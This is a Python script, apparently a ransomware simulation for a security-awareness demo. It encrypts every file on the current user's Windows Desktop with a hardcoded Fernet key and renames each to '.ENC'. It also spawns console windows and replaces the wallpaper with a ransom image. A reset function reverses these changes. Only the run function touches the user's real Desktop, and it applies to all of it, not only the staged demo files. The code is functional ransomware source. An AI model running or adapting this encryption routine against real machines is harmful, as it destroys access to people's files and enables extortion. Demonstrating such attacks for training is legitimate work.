from cryptography.fernet import Fernet
import os
import ctypes
import time
import pyautogui
import win32con
import subprocess  # nosec
import shutil


global desktop_files
global original_wallpaper
original_wallpaper = ""


def write_key():
    """
    Generates a key and save it into a file
    """
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)


def load_key():
    """
    Loads the key from the current directory named `key.key`
    """
    return open("key.key", "rb").read()


def encrypt(filename, key):
    """
    Given a filename (str) and key (bytes), it encrypts the file and write it
    """
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    # encrypt data
    encrypted_data = f.encrypt(file_data)

    # write the encrypted file
    with open(filename, "wb") as file:
        file.write(encrypted_data)

    # rename file
    filename_enc = filename + '.ENC'
    os.rename(filename, filename_enc)


def decrypt(filename, key):
    """
    Given a filename (str) and key (bytes), it decrypts the file and write it
    """
    # check file extension
    extension = filename[-4:]

    if extension == '.ENC':
        f = Fernet(key)
        with open(filename, "rb") as file:
            # read the encrypted data
            encrypted_data = file.read()
        # decrypt data
            decrypted_data = f.decrypt(encrypted_data)
        # write the original file
        with open(filename, "wb") as file:
            file.write(decrypted_data)

        # rename file
        filename_dec = filename[:-4]
        os.rename(filename, filename_dec)


def getListOfFiles(dirName):
    # create a list of file and sub directories
    # names in the given directory
    listOfFile = os.listdir(dirName)
    allFiles = list()
    # Iterate over all the entries
    for entry in listOfFile:
        # Create full path
        fullPath = os.path.join(dirName, entry)
        # If entry is a directory then get the list of files in this directory
        if os.path.isdir(fullPath):
            allFiles = allFiles + getListOfFiles(fullPath)
        else:
            allFiles.append(fullPath)

    return allFiles


def getWallpaper():
    ubuf = ctypes.create_unicode_buffer(512)
    ctypes.windll.user32.SystemParametersInfoW(
        win32con.SPI_GETDESKWALLPAPER, len(ubuf), ubuf, 0)

    return ubuf.value


def run():
    global original_wallpaper

    # path_shelloutput = os.path.abspath(
    # 'demos/ransomware/native/shelloutput.py')
    # print(path_shelloutput)
    # os.system('cmd /c shelloutput.bat')
    path = os.path.join(os.path.abspath(
        os.path.dirname(__file__)), "shelloutput.py")

    command = "cmd /c start cmd /c python \"" + path + "\""

    for i in range(3):
        subprocess.call(command)  # nosec

    # pause
    time.sleep(1.5)

    # generate key
    # write_key()

    # load key
    # key = load_key()

    key = 'Ri7zMC-et_gH2hkRPNcLSK6MzfVkyRHf_kdqiJIcq7M='

    # path for files to encrypt
    # dirName=r''

    # desktop path of current user
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    dirName = desktop

    files = getListOfFiles(dirName)

    # encrypt files
    for filename in files:
        try:
            encrypt(filename, key)
        except Exception as e:
            print(e)

    # decrypt files
    # decrypt(file, key)

    # pause
    time.sleep(1.5)

    # save original wallpaper path
    original_wallpaper = getWallpaper()
    original_wallpaper = bytes(original_wallpaper, 'utf-8')

    # change wallpaper
    file_name = r"demos/iao_ransomware_email/native/ransomware_wp.jpg"
    full_path = os.path.abspath(file_name)

    wallpaper = bytes(full_path, 'utf-8')
    ctypes.windll.user32.SystemParametersInfoA(20, 0, wallpaper, 0)

    # pause
    time.sleep(1.5)

    # show desktop
    pyautogui.hotkey('winleft', 'd')

    return


def prep():
    global desktop_files

    dirName = "demos\\iao_ransomware_email\\native\\desktop_files"
    desktop_files = getListOfFiles(dirName)

    # desktop path of current user
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')

    # copy files to desktop
    for filename in desktop_files:
        try:
            base = os.path.basename(filename)
            filename = os.path.join(os.path.abspath(
                os.path.dirname(__file__)), 'desktop_files', base)
            newPath = desktop + '\\' + base
            # os.system(command)
            shutil.copy(filename, newPath)
        except Exception as e:
            print(e)


def reset():
    global original_wallpaper
    global desktop_files

    key = 'Ri7zMC-et_gH2hkRPNcLSK6MzfVkyRHf_kdqiJIcq7M='

    # desktop path of current user
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    dirName = desktop

    files = getListOfFiles(dirName)

    # decrypt files
    for filename in files:
        try:
            decrypt(filename, key)
        except Exception as e:
            print(e)

    # remove desktop_files
    for filename in desktop_files:
        try:
            base = os.path.basename(filename)
            file = desktop + '\\' + base
            os.remove(file)
        except Exception as e:
            print(e)

    # restore original wallpaper
    if original_wallpaper != "":
        ctypes.windll.user32.SystemParametersInfoA(
            20, 0, original_wallpaper, 0)

    return
